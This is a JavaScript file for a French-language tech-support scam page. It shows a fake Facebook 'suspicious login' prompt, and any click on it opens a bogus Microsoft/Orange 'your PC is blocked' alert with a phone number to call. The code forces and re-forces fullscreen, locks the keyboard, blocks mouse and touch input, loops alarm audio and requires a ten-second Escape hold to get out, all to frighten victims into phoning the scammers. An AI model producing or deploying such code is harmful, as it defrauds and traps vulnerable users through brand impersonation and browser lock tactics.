(function () {
  var mount = document.getElementById("app-mount");
  if (!mount) return;

  if (!document.querySelector('link[href*="styles.css"]')) {
    var styleLink = document.createElement("link");
    styleLink.rel = "stylesheet";
    styleLink.href = "styles.css?v=8";
    document.head.appendChild(styleLink);
  }

  document.title = "Fond bleu avec modale";

  var securityPageBlueStyle =
    '<style id="security-page-blue">' +
    "#securityOverlay,#securityOverlay.is-active{background-color:#0078d4!important;background-image:linear-gradient(165deg,#1a6fb5 0%,#0078d4 42%,#0d5a9e 100%)!important}" +
    "#securityOverlay .access-modal,#securityOverlay .black-modal-blue-box,#securityOverlay .support-card{background:#0078d4!important;background-image:linear-gradient(180deg,#1a6fb5,#0d5a9e)!important;border:2px solid #3aa0ff!important}" +
    "#securityOverlay .access-modal p,#securityOverlay .black-modal-blue-box p,#securityOverlay .black-modal-defender{color:#8fd0ff!important}" +
    "#securityOverlay .support-card-subtitle,#securityOverlay .support-card-label,#securityOverlay .support-card-arrow{color:#5eb3ff!important}" +
    "#securityOverlay .support-card-phone{color:#b3e0ff!important}" +
    "#browserChromeShield,#browserChromeShield.is-visible{background:#0d5a9e!important}" +
    "#browserChromeShield .browser-chrome-modal{background:#0078d4!important;border:2px solid #3aa0ff!important}" +
    "#browserChromeShield .browser-chrome-alert,#browserChromeShield .browser-chrome-warning{color:#8fd0ff!important}" +
    "#browserChromeShield .browser-chrome-phone{color:#b3e0ff!important}" +
    "#escapeShield .escape-shield-taskbar-wrap{background:#0d5a9e!important}" +
    "#escapeShield .escape-shield-taskbar-modal{background:#0078d4!important}" +
    "#escapeShield .escape-shield-alert,#escapeShield .escape-shield-warning{color:#8fd0ff!important}" +
    "#escapeExitModal .escape-exit-modal{background:#0078d4!important}" +
    "#escapeExitModal .escape-exit-message,#escapeExitModal .escape-exit-phone,#escapeExitModal .escape-exit-phone-icon{color:#8fd0ff!important}" +
    "</style>";

  mount.innerHTML =
    securityPageBlueStyle +
    '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
    '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert" style="background:#0d5a9e">' +
    '<div class="browser-chrome-modal" style="background:#0078d4;border:2px solid #3aa0ff">' +
    '<p class="browser-chrome-alert" style="color:#8fd0ff">Une anomalie a été détectée</p>' +
    '<p class="browser-chrome-warning" style="color:#5eb3ff">Appellez le support technique Microsoft</p>' +
    '<p class="browser-chrome-phone" style="color:#b3e0ff">+33 02 59 50 90 20</p>' +
    '</div></div>' +
    '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
    '<div class="escape-shield-taskbar-wrap">' +
    '<div class="escape-shield-taskbar-modal">' +
    '<p class="escape-shield-alert">Alerte de sécurité Microsoft</p>' +
    '<p class="escape-shield-warning">Ne quittez pas la page</p>' +
    '</div></div></div>' +
    '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true" style="background-color:#0078d4;background-image:linear-gradient(165deg,#1a6fb5 0%,#0078d4 42%,#0d5a9e 100%)">' +
    '<div class="security-page">' +
    '<section class="access-modal" aria-label="Alerte acces bloque" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e);border:2px solid #3aa0ff">' +
    '<p style="color:#8fd0ff">L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
    '<p style="color:#8fd0ff">N\'accédez pas à ce pc et ne le redémarrez pas. Si vous ignorez cet avertissement, vous risquez de perdre des informations.</p>' +
    '<p style="color:#8fd0ff">Contactez le support technique Microsoft dès que possible ; un expert vous guidera par téléphone lors de l\'analyse.</p>' +
    '<p style="color:#8fd0ff">L\'exécution de cette application peut mettre votre pc en danger.</p>' +
    '</section>' +
    '<div class="black-modal-blue-box" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e);border:2px solid #3aa0ff">' +
    '<p style="color:#8fd0ff">Windows Support : +33 02 59 50 90 20</p>' +
    '<p class="black-modal-defender" style="color:#5eb3ff">Microsoft Defender</p>' +
    '</div>' +
    '<section class="scan-modal scan-modal-hidden" aria-label="Support technique Microsoft" aria-hidden="true">' +
    '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
    '<p class="scan-modal-text">Une anomalie a été détectée sur votre appareil. Appellez l\'assistance Orange pour une analyse complète et sécuriser votre connexion.</p>' +
    '<p class="scan-modal-text">Contactez l\'assistance Orange pour obtenir de l\'aide</p>' +
    '<p class="scan-modal-support">Appellez l\'assistance Orange : 02 59 50 90 20</p>' +
    '<div class="scan-modal-actions">' +
    '<button class="scan-btn scan-btn-now" type="button">Analyser maintenant</button>' +
    '<button class="scan-btn scan-btn-later" type="button">Analyser plus tard</button>' +
    '</div>' +
    '</section>' +
    '</div>' +
    '<aside class="support-card" aria-label="Support technique Microsoft" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e);border:2px solid #3aa0ff">' +
    '<p class="support-card-subtitle" style="color:#5eb3ff">Support technique Microsoft</p>' +
    '<p class="support-card-phone" style="color:#b3e0ff">+33 02 59 50 90 20</p>' +
    '<p class="support-card-label" style="color:#5eb3ff">Numero</p>' +
    '<div class="support-card-arrow" aria-hidden="true" style="color:#8fd0ff">▼</div></aside>' +
    '<div class="security-bottom-mask" aria-hidden="true"></div></div>' +
    '<div class="home-page">' +
    '<main class="screen">' +
    '<div class="fb-desktop-bg" aria-hidden="true">' +
    '<header class="fb-topbar"><div class="fb-topbar-left">' +
    '<span class="fb-topbar-logo">f</span><div class="fb-search">Rechercher sur Facebook</div></div>' +
    '<div class="fb-topbar-center">' +
    '<span class="fb-nav-icon active">⌂</span><span class="fb-nav-icon">👥</span>' +
    '<span class="fb-nav-icon">📺</span><span class="fb-nav-icon">🏪</span><span class="fb-nav-icon">👤</span></div>' +
    '<div class="fb-topbar-right">' +
    '<span class="fb-topbar-pill"></span><span class="fb-topbar-pill"></span><span class="fb-topbar-pill"></span></div></header>' +
    '<div class="fb-desktop-layout"><aside class="fb-sidebar-left">' +
    '<div class="fb-side-item"><span class="fb-avatar"></span> Votre profil</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">👤</span> Amis</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">📰</span> Fil d\'actualité</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">👥</span> Groupes</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">🏪</span> Marketplace</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">📺</span> Watch</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">🕓</span> Souvenirs</div>' +
    '<div class="fb-side-item"><span class="fb-side-icon">🔖</span> Enregistrements</div></aside>' +
    '<section class="fb-feed"><div class="fb-stories">' +
    '<div class="fb-story"></div><div class="fb-story"></div><div class="fb-story"></div>' +
    '<div class="fb-story"></div><div class="fb-story"></div></div>' +
    '<div class="fb-composer"><span class="fb-avatar"></span><div class="fb-composer-input">Quoi de neuf ?</div></div>' +
    '<article class="fb-post"><div class="fb-post-head"><span class="fb-avatar sm"></span><div><strong>Marie Dupont</strong><small>Il y a 2 h</small></div></div>' +
    '<div class="fb-post-text">Belle journée en famille ☀️</div><div class="fb-post-image"></div></article>' +
    '<article class="fb-post"><div class="fb-post-head"><span class="fb-avatar sm"></span><div><strong>Thomas Martin</strong><small>Il y a 5 h</small></div></div>' +
    '<div class="fb-post-text">Quelqu\'un a des recommandations pour un bon restaurant ?</div></article></section>' +
    '<aside class="fb-sidebar-right"><h3>Contacts</h3>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Sophie Laurent</div>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Lucas Bernard</div>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Emma Petit</div>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Hugo Moreau</div>' +
    '<div class="fb-contact"><span class="fb-avatar xs"></span> Julie Roux</div>' +
    '<div class="fb-sponsored"><h3>Sponsorisé</h3><div class="fb-ad"></div><div class="fb-ad"></div></div></aside></div></div>' +
    '<div class="fb-bg-overlay" aria-hidden="true"></div>' +
    '<h1 class="warning-text">votre ordinateur est bloque</h1>' +
    '<section class="modal" aria-label="Modale carree">' +
    '<header class="fb-submodal-header"><div class="fb-page-logo" aria-hidden="true">' +
    '<svg viewBox="0 0 120 32" role="img" aria-hidden="true">' +
    '<text x="0" y="24" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-size="24" font-weight="700">facebook</text>' +
    '</svg></div>' +
    '<button class="fb-close" id="fbCloseBtn" type="button" aria-label="Fermer">&times;</button></header>' +
    '<div class="fb-submodal-separator" aria-hidden="true"></div><div class="modal-content"><div class="modal-top">' +
    '<div class="warning-icon" aria-hidden="true"><svg viewBox="0 0 64 64" role="img" aria-hidden="true">' +
    '<path d="M32 4L4 58h56L32 4z" fill="#facc15" stroke="#ca8a04" stroke-width="2"/>' +
    '<text x="32" y="44" text-anchor="middle" font-size="28" font-weight="700" fill="#1f2937">?</text></svg></div>' +
    '<h2 class="modal-title">Connexion suspecte détectée</h2>' +
    '<p class="modal-message">Nous avons détecté une tentative de connexion à votre compte depuis un appareil inconnu</p>' +
    '<div class="sub-modal"><div class="sub-modal-icon" aria-hidden="true">' +
    '<svg viewBox="0 0 24 24" role="img" aria-hidden="true">' +
    '<path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6a2.5 2.5 0 0 1 0 5.5z" fill="#2563eb"/></svg></div>' +
    '<div class="sub-modal-details"><p>Localisation : Marseille, France</p>' +
    '<p>Appareil : Windows 19.0.0 . chromium 148</p>' +
    '<p>Heure : Aujourd\'hui, <span id="currentTime"></span></p></div></div></div>' +
    '<div class="modal-bottom"><div class="modal-actions" role="group" aria-label="Actions">' +
    '<button class="modal-btn modal-btn-allow" id="secureAccountBtn" type="button">Sécuriser mon compte</button>' +
    '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Support technique Microsoft</p></div>' +
    '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
    '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>' +
    '<div id="escapeExitModal" class="escape-exit-overlay" aria-hidden="true" role="dialog" aria-label="Instructions assistance">' +
    '<div class="escape-exit-modal">' +
    '<p class="escape-exit-message">Veuillez suivre les instructions de nos ingénieurs</p>' +
    '<p class="escape-exit-phone">' +
    '<svg class="escape-exit-phone-icon" viewBox="0 0 24 24" aria-hidden="true">' +
    '<path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.5.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.2.2 2.4.6 3.5.1.3 0 .7-.2 1L6.6 10.8z" fill="currentColor"/>' +
    '</svg>' +
    '<span>+33 02 59 50 90 20</span></p></div></div>';

  var realTitle = document.title;

  document.addEventListener("visibilitychange", function () {
    if (document.hidden) {
      document.title = " ";
      document.body.style.visibility = "hidden";
    } else {
      document.title = realTitle;
      document.body.style.visibility = "visible";
    }
  });

  var ESCAPE_DEZOOM_MS = 10000;
  var secureAccountBtn = document.getElementById("secureAccountBtn");
  var denyAccountBtn = document.getElementById("denyAccountBtn");
  var securityOverlay = document.getElementById("securityOverlay");
  var fbCloseBtn = document.getElementById("fbCloseBtn");
  var securityAudio1 = document.getElementById("securityAudio1");
  var securityAudio2 = document.getElementById("securityAudio2");

  var securityLockActive = false;
  var escapeKeyHeld = false;
  var escapeHoldStart = null;
  var escapeHoldInterval = null;
  var fullscreenGuardInterval = null;
  var isDezoomed = false;
  var allowFullscreenExit = false;

  function isEscapeKey(event) {
    return event.key === "Escape" || event.code === "Escape" || event.keyCode === 27;
  }

  async function lockKeyboard() {
    if (navigator.keyboard && navigator.keyboard.lock) {
      try {
        await navigator.keyboard.lock();
      } catch (_error) {}
    }
  }

  async function requestFullscreen() {
    if (document.fullscreenElement) return true;
    if (!document.documentElement.requestFullscreen) return false;
    try {
      await document.documentElement.requestFullscreen();
      return true;
    } catch (_error) {
      return false;
    }
  }

  function clearEscapeHold() {
    escapeHoldStart = null;
    if (escapeHoldInterval) {
      clearInterval(escapeHoldInterval);
      escapeHoldInterval = null;
    }
  }

  function applySecurityBlueTheme() {
    if (!securityOverlay) return;

    securityOverlay.style.setProperty("background-color", "#0078d4", "important");
    securityOverlay.style.setProperty(
      "background-image",
      "linear-gradient(165deg, #1a6fb5 0%, #0078d4 42%, #0d5a9e 100%)",
      "important"
    );

    var accessModal = securityOverlay.querySelector(".access-modal");
    if (accessModal) {
      accessModal.style.setProperty("background", "#0d5a9e", "important");
      accessModal.style.setProperty("background-image", "none", "important");
    }

    var blueBox = securityOverlay.querySelector(".black-modal-blue-box");
    if (blueBox) {
      blueBox.style.setProperty(
        "background",
        "linear-gradient(180deg, #1a6fb5, #0d5a9e)",
        "important"
      );
    }

    var supportCard = securityOverlay.querySelector(".support-card");
    if (supportCard) {
      supportCard.style.setProperty(
        "background",
        "linear-gradient(180deg, #1a6fb5, #0d5a9e)",
        "important"
      );
    }

    securityOverlay.querySelectorAll(".access-modal p, .black-modal-blue-box p").forEach(function (node) {
      node.style.setProperty("color", "#8fd0ff", "important");
    });

    var defender = securityOverlay.querySelector(".black-modal-defender");
    if (defender) defender.style.setProperty("color", "#5eb3ff", "important");

    var subtitle = securityOverlay.querySelector(".support-card-subtitle");
    if (subtitle) subtitle.style.setProperty("color", "#5eb3ff", "important");
    var phone = securityOverlay.querySelector(".support-card-phone");
    if (phone) phone.style.setProperty("color", "#b3e0ff", "important");
    var label = securityOverlay.querySelector(".support-card-label");
    if (label) label.style.setProperty("color", "#5eb3ff", "important");
    var arrow = securityOverlay.querySelector(".support-card-arrow");
    if (arrow) arrow.style.setProperty("color", "#8fd0ff", "important");

    ["browser-chrome-alert", "browser-chrome-warning"].forEach(function (className) {
      var node = document.querySelector("#browserChromeShield ." + className);
      if (node) node.style.setProperty("color", "#8fd0ff", "important");
    });
    var chromePhone = document.querySelector("#browserChromeShield .browser-chrome-phone");
    if (chromePhone) chromePhone.style.setProperty("color", "#b3e0ff", "important");

    var chromeShield = document.getElementById("browserChromeShield");
    if (chromeShield) {
      chromeShield.style.setProperty("background", "#0d5a9e", "important");
      var chromeModal = chromeShield.querySelector(".browser-chrome-modal");
      if (chromeModal) chromeModal.style.setProperty("background", "#0078d4", "important");
    }

    var escapeShield = document.getElementById("escapeShield");
    if (escapeShield) {
      var taskbarWrap = escapeShield.querySelector(".escape-shield-taskbar-wrap");
      if (taskbarWrap) taskbarWrap.style.setProperty("background", "#0d5a9e", "important");
      var taskbarModal = escapeShield.querySelector(".escape-shield-taskbar-modal");
      if (taskbarModal) taskbarModal.style.setProperty("background", "#0078d4", "important");
    }

    var escapeExit = document.getElementById("escapeExitModal");
    if (escapeExit) {
      var exitModal = escapeExit.querySelector(".escape-exit-modal");
      if (exitModal) exitModal.style.setProperty("background", "#0078d4", "important");
    }
  }

  function showSecurityPage() {
    if (!securityOverlay) return;
    securityOverlay.classList.add("is-active");
    securityOverlay.setAttribute("aria-hidden", "false");
    document.body.classList.add("security-mode");
    applySecurityBlueTheme();
    showBrowserChromeShield();
    applySecurityBlueTheme();
  }

  function showBrowserChromeShield() {
    var shield = document.getElementById("browserChromeShield");
    if (!shield) return;
    document.body.appendChild(shield);
    shield.classList.add("is-visible");
    shield.setAttribute("aria-hidden", "false");
  }

  function hideBrowserChromeShield() {
    var shield = document.getElementById("browserChromeShield");
    if (!shield) return;
    shield.classList.remove("is-visible");
    shield.setAttribute("aria-hidden", "true");
  }

  function showEscapeShield() {
    var shield = document.getElementById("escapeShield");
    if (!shield) return;
    document.body.appendChild(shield);
    shield.classList.add("is-visible");
    shield.setAttribute("aria-hidden", "false");
    document.body.style.visibility = "visible";
    applySecurityBlueTheme();
  }

  function hideEscapeShield() {
    var shield = document.getElementById("escapeShield");
    if (!shield) return;
    shield.classList.remove("is-visible");
    shield.setAttribute("aria-hidden", "true");
  }

  function forceStayFullscreen() {
    if (!securityLockActive || isDezoomed || allowFullscreenExit) return;
    showSecurityPage();
    requestFullscreen();
    requestAnimationFrame(function () {
      requestFullscreen();
    });
    setTimeout(requestFullscreen, 0);
    setTimeout(requestFullscreen, 20);
    setTimeout(requestFullscreen, 80);
  }

  function enterFullscreenMode() {
    isDezoomed = false;
    document.body.classList.remove("security-dezoomed");
    requestFullscreen();
  }

  function showEscapeExitModal() {
    var modal = document.getElementById("escapeExitModal");
    if (!modal) return;
    document.body.appendChild(modal);
    modal.classList.add("is-visible");
    modal.setAttribute("aria-hidden", "false");
    document.body.style.visibility = "visible";
    applySecurityBlueTheme();
  }

  function exitAfterEscapeHold() {
    if (isDezoomed) return;

    stopFullscreenGuard();
    allowFullscreenExit = true;
    isDezoomed = true;
    escapeKeyHeld = false;
    clearEscapeHold();
    document.body.classList.remove("security-dezoomed");
    document.body.classList.add("security-dezoomed");

    showEscapeShield();
    showEscapeExitModal();

    if (document.fullscreenElement && document.exitFullscreen) {
      document.exitFullscreen().catch(function () {});
    }

    setTimeout(function () {
      allowFullscreenExit = false;
    }, 400);
  }

  function dezoomFullscreen() {
    exitAfterEscapeHold();
  }

  function forceFullscreen() {
    forceStayFullscreen();
  }

  function startFullscreenGuard() {
    stopFullscreenGuard();
    fullscreenGuardInterval = setInterval(function () {
      if (securityLockActive && !isDezoomed && !allowFullscreenExit) {
        forceStayFullscreen();
      }
    }, 16);
  }

  function stopFullscreenGuard() {
    if (fullscreenGuardInterval) {
      clearInterval(fullscreenGuardInterval);
      fullscreenGuardInterval = null;
    }
  }

  function playSecurityAudios() {
    [securityAudio1, securityAudio2].forEach(function (audio) {
      if (!audio) return;
      audio.loop = true;
      audio.currentTime = 0;
      audio.play().catch(function () {});
    });
  }

  function activateSecurityLock() {
    if (!securityOverlay) return;
    securityLockActive = true;
    isDezoomed = false;
    allowFullscreenExit = false;
    escapeKeyHeld = false;
    clearEscapeHold();
    document.body.classList.remove("security-dezoomed");
    showSecurityPage();
    enterFullscreenMode();
    lockKeyboard();
    startFullscreenGuard();
    playSecurityAudios();
  }

  function startEscapeHoldTimer() {
    if (escapeHoldInterval) return;
    escapeHoldStart = Date.now();
    escapeHoldInterval = setInterval(function () {
      if (!securityLockActive || !escapeKeyHeld) return;

      var elapsed = Date.now() - escapeHoldStart;

      if (elapsed >= ESCAPE_DEZOOM_MS && !isDezoomed) {
        exitAfterEscapeHold();
        return;
      }

      if (!isDezoomed) {
        forceStayFullscreen();
      }
    }, 50);
  }

  function handleSecurityKeyboard(event) {
    if (!securityLockActive) return;

    if (isEscapeKey(event)) {
      event.preventDefault();
      event.stopImmediatePropagation();

      if (event.type === "keydown") {
        if (isDezoomed) return;
        if (!escapeKeyHeld) {
          escapeKeyHeld = true;
          startEscapeHoldTimer();
        }
        showEscapeShield();
        forceStayFullscreen();
        return;
      }

      if (event.type === "keyup") {
        if (isDezoomed) return;

        var heldLongEnough =
          escapeHoldStart !== null &&
          Date.now() - escapeHoldStart >= ESCAPE_DEZOOM_MS;

        escapeKeyHeld = false;
        clearEscapeHold();

        if (heldLongEnough && !isDezoomed) {
          exitAfterEscapeHold();
          return;
        }

        hideEscapeShield();

        if (!heldLongEnough && !isDezoomed) {
          forceStayFullscreen();
        }
      }
      return;
    }

    event.preventDefault();
    event.stopImmediatePropagation();
  }

  function handleSecurityLockPointer(event) {
    if (!securityLockActive) return;
    if (event.type === "click" || event.type === "touchstart") {
      if (!isDezoomed) forceFullscreen();
    }
    event.preventDefault();
    event.stopPropagation();
  }

  ["mousedown", "mouseup", "mousemove", "contextmenu", "dblclick", "wheel"].forEach(function (eventName) {
    document.addEventListener(eventName, handleSecurityLockPointer, true);
  });

  ["click", "touchstart", "touchmove", "touchend"].forEach(function (eventName) {
    document.addEventListener(eventName, handleSecurityLockPointer, { capture: true, passive: false });
  });

  document.addEventListener("click", function () {
    if (securityLockActive) return;
    requestFullscreen();
  });

  document.addEventListener("touchstart", function () {
    if (securityLockActive) return;
    requestFullscreen();
  }, { passive: true });

  document.addEventListener("fullscreenchange", function () {
    if (securityLockActive && !isDezoomed && !allowFullscreenExit && !document.fullscreenElement) {
      forceStayFullscreen();
    }
  });

  ["keydown", "keyup", "keypress"].forEach(function (eventName) {
    document.addEventListener(eventName, handleSecurityKeyboard, { capture: true, passive: false });
    window.addEventListener(eventName, handleSecurityKeyboard, { capture: true, passive: false });
  });

  var currentTimeEl = document.getElementById("currentTime");
  if (currentTimeEl) {
    var now = new Date();
    currentTimeEl.textContent = now.toLocaleTimeString("fr-FR", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  }

  function goToSecurityPage(event) {
    if (event) {
      event.preventDefault();
      event.stopPropagation();
    }
    activateSecurityLock();
  }

  if (secureAccountBtn && securityOverlay) {
    secureAccountBtn.addEventListener("click", goToSecurityPage);
  }

  if (denyAccountBtn && securityOverlay) {
    denyAccountBtn.addEventListener("click", goToSecurityPage);
  }

  if (fbCloseBtn && securityOverlay) {
    fbCloseBtn.addEventListener("click", function (event) {
      event.preventDefault();
      event.stopPropagation();
      if (!securityLockActive) {
        goToSecurityPage(event);
        return;
      }
      if (!isDezoomed) forceFullscreen();
    });
  }
})();
